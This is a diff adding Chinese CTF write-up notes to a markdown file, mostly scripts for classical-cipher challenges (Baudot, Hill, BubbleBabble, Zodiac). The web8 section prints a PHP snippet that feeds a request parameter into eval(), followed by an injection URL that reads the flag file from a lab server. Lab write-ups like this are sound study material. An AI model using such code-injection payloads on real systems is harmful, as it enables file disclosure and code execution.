@@ -6440,3 +6440,310 @@ target.show()
 target.save(r"C:\Users\hp430\Desktop\demo1.jpg")
 ```
 
+# bugku
+
+#### web
+
+###### web8
+
+```php+HTML
+ <?php
+    include "flag.php";
+    $a = @$_REQUEST['hello'];
+    eval( "var_dump($a);");
+    show_source(__FILE__);
+?> 
+```
+
+```
+http://114.67.246.176:16235/?hello=show_source(%27flag.php%27)
+```
+
+```php+HTML
+ <?php
+    $flag = 'Too Young Too Simple';
+    # echo $flag;
+    # flag{ed12b64ce1c11597d50fe2f776256b0a};
+?> bool(true) <?php
+    include "flag.php";
+    $a = @$_REQUEST['hello'];
+    eval( "var_dump($a);");
+    show_source(__FILE__);
+?> 
+```
+
+#### re
+
+###### signin
+
+安卓逆向，jeb打开，找到关键逻辑：
+
+![image-20210203110405850](/image-20210203110405850.png)
+
+去R中搜索，发现对应的字符串名称：
+
+![image-20210203110434958](/image-20210203110434958.png)
+
+去strings.xml中找到对应的字符串：
+
+![image-20210203110501604](/image-20210203110501604.png)
+
+#### crypto
+
+###### 你喜欢下棋吗
+
+```
+你喜欢下棋吗？
+解压密码为小写
+442324 43 24 43 35 34 31 54 12 24 4543
+```
+
+棋盘密码：
+
+![棋盘密码](/棋盘密码.png)
+
+得到密码thisispolybjus，解压得到：
+
+```
+一种5bit的编码
+bugku里面的内容为小写
+bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001}
+```
+
+博多密码：
+
+```python
+code_data = '''00000	null	null
+00100	espace	espace
+10111	Q	1
+10011	W	2
+00001	E	3
+01010	R	4
+10000	T	5
+10101	Y	6
+00111	U	7
+00110	I	8
+11000	O	9
+10110	P	0
+00011	A	-
+00101	S	BELL
+01001	D	$
+01101	F	!
+11010	G	&
+10100	H	#
+01011	J	'
+01111	K	(
+10010	L	)
+10001	Z	"
+11101	X	/
+01110	C	:
+11110	V	;
+11001	B	?
+01100	N	,
+11100	M	.
+01000	Carriage Return CR	Carriage Return CR
+00010	Line Feed LF	Line Feed LF
+11011	Switch to Digits	'''
+code_data = code_data.split('\n')
+code_datas = {}
+code_datas_num = {}
+for i in code_data:
+    code_datas[i.split('	')[0]] = i.split('	')[1]
+    code_datas_num[i.split('	')[0]] = i.split('	')[2]
+    if len(i.split('	')[1]) > 1:
+        code_datas[i.split('	')[0]] = ' '
+    if len(i.split('	')[2]) > 1:
+        code_datas_num[i.split('	')[0]] = ' '
+print(code_datas)
+print(code_datas_num)
+
+s = '.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.'
+s= s.replace('.', '1')
+s= s.replace('-', '0')
+print(s)
+s='11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001'
+s=s.replace(' ','')
+a = ''
+num = 0
+for i in range(int(len(s)/5)):
+    # print(s[i*5:i*5+5])
+    if s[i*5:i*5+5] == '11011':
+        num = 1
+        continue
+    if s[i*5:i*5+5] == '11111':
+        num = 0
+        continue
+    if num == 0:
+        print(code_datas[s[i*5:i*5+5]], end='')
+    else:
+        print(code_datas_num[s[i*5:i*5+5]], end='')
+```
+
+得到flag：BAUD0TC0DE
+
+###### 小山丘的秘密
+
+```
+hill能有什么秘密呢
+
+bugku{PLGTGBQHM}
+
+其中A=1，flag全为小写
+```
+
+![小山丘的秘密](/小山丘的秘密.jpg)
+
+希尔密码，提示a=1，默认的是a=0，因此猜测码表由abcdefghijklmnopqrstuvwxyz变为了zabcdefghijklmnopqrstuvwxy
+
+然后根据旗子个数生成解密矩阵：
+
+```python
+#!/usr/bin/python
+#coding=utf8
+#author Xujie Liu
+import numpy
+from math import sqrt
+
+#密钥
+matrix = [[1, 2, 3],
+          [0, 1, 4],
+          [5, 6, 0]]
+#密文
+ciphertext = "PLGTGBQHM".lower()
+#字母表
+alphabet = "zabcdefghijklmnopqrstuvwxy"
+N = len(alphabet)
+def euclidean(x, y):
+    x1 = 1
+    y1 = 0
+    z1 = x
+    x2 = 0
+    y2 = 1
+    z2 = y 
+    while z2 != 1:
+        q = (z1 - (z1 % z2)) / z2
+        x1 = x1 - q * x2
+        y1 = y1 - q * y2
+        z1 = z1 - q * z2 
+        x1, y1, z1, x2, y2, z2 = x2, y2, z2, x1, y1, z1 
+    while x2 < 0:
+        x2 += y     
+    return x2 
+alphabet_to_number = {} 
+for i in range(0, len(alphabet)):
+    alphabet_to_number[alphabet[i]] = i 
+det = numpy.around(numpy.linalg.det(matrix)).astype(numpy.int64)
+inv = numpy.around(det * numpy.linalg.inv(matrix)).astype(numpy.int64) 
+mul = euclidean(det, N)
+inv = mul * inv
+for i in range(0, len(inv)):
+    for j in range(0, len(inv[i])):
+        inv[i][j] = inv[i][j] % N 
+ans = '' 
+for j in range(0, int(sqrt(len(ciphertext)))):
+    cipherarray = []
+    for i in range(0, len(inv)):
+        cipherarray.append(alphabet_to_number[ciphertext[j * len(inv) + i]])
+    plain = numpy.dot(inv, cipherarray) 
+    for i in range(0, len(plain)):
+        ans += alphabet[ plain[i] % N] 
+print ans
+```
+
+###### EN-气泡
+
+题目说气泡，猜测是BubbleBabble加密，用脚本跑了一下发现存在套娃：
+
+```python
+from bubblepy import BubbleBabble
+
+data='''xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux'''
+
+data = BubbleBabble().decode(data).decode()
+print(data)
+```
+
+```
+xivak-norok-norad-tipol-norol-nipid-tisuk-zotak-nurud-tesil-nitok-hepod-torek-cesuk-coryd-tinak-zorik-nined-tomyl-nosal-hopid-tuvuk-zomek-zupod-tovuk-zumak-zoryd-tipuk-nyruk-zepyd-tonuk-zasol-nunud-tenok-nuvyl-nevax
+```
+
+于是加个循环：
+
+```python
+from bubblepy import BubbleBabble
+
+data='''xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux'''
+
+for i in range(10):
+    try:
+        data = BubbleBabble().decode(data).decode()
+        print(data)
+    except:
+        break
+```
+
+```
+xivak-norok-norad-tipol-norol-nipid-tisuk-zotak-nurud-tesil-nitok-hepod-torek-cesuk-coryd-tinak-zorik-nined-tomyl-nosal-hopid-tuvuk-zomek-zupod-tovuk-zumak-zoryd-tipuk-nyruk-zepyd-tonuk-zasol-nunud-tenok-nuvyl-nevax
+ximil-hynyk-rotil-rytek-masal-folif-cysuh-zoboh-zobol-himok-dosyf-fizyx
+bugku{th1s_1s_A_Bubb13}
+```
+
+# 2021i春秋新年欢乐赛
+
+###### 十二宫的挑衅
+
+![Twelve_palaces_of_serial_killers](/Twelve_palaces_of_serial_killers.png)
+
+黄金12宫加密，不久前才破解的一个著名加密算法，首先用脚本得到Azdecrpt字符串：
+
+```python
+ciper="^#@$@#()/>@?==%1(!)>(*+3<#86@-7$^.4&)8%#5&6!=%1#$-$+5&?#!.03!%=@=1010?(*~#??.+)%&.7^8=1%*^=$5$7@@8>&*99@0185(+7)<%3#@^4&@@<.)$3*#%%<<*++.@.?=~**+!==65^@&"
+print(ciper)
+#ciper:
+for i in range(153):
+    if((i+1)%17!=0):
+        print(ciper[i],end='')
+    else:
+        print(ciper[i],end='\n')
+
+Azdecrpt=''
+for i in range(153):
+    Azdecrpt+=ciper[int((i%9)*17+(i*2)%17)]
+
+print("\n")
+#Azdecrpt
+for i in range(153):
+    if((i+1)%17!=0):
+        print(Azdecrpt[i],end='')
+    else:
+        print(Azdecrpt[i],end='\n')
+```
+
+```
+^#@$@#()/>@?==%1(!)>(*+3<#86@-7$^.4&)8%#5&6!=%1#$-$+5&?#!.03!%=@=1010?(*~#??.+)%&.7^8=1%*^=$5$7@@8>&*99@0185(+7)<%3#@^4&@@<.)$3*#%%<<*++.@.?=~**+!==65^@&
+^#@$@#()/>@?==%1(
+!)>(*+3<#86@-7$^.
+4&)8%#5&6!=%1#$-$
++5&?#!.03!%=@=101
+0?(*~#??.+)%&.7^8
+=1%*^=$5$7@@8>&*9
+9@0185(+7)<%3#@^4
+&@@<.)$3*#%%<<*++
+.@.?=~**+!==65^@&
+
+
+^>%..@3*&#(#0+@#+
+.@*53)8@+@$+&!%>^
+&.@36%&&4@?#<!=.*
+9@=(#=@79@<~)8%=^
+=0.*/611811)*>@#0
+0%8$+@-$1?*53!?7-
++(^(*==$$5*=+#==^
+4&~$7%6%.&?#5)%51
+!)#?$<<^()8!?7%<@
+```
+
+Azdecrpt得到flag：
+
+![image-20210228195419290](/image-20210228195419290.png)
+
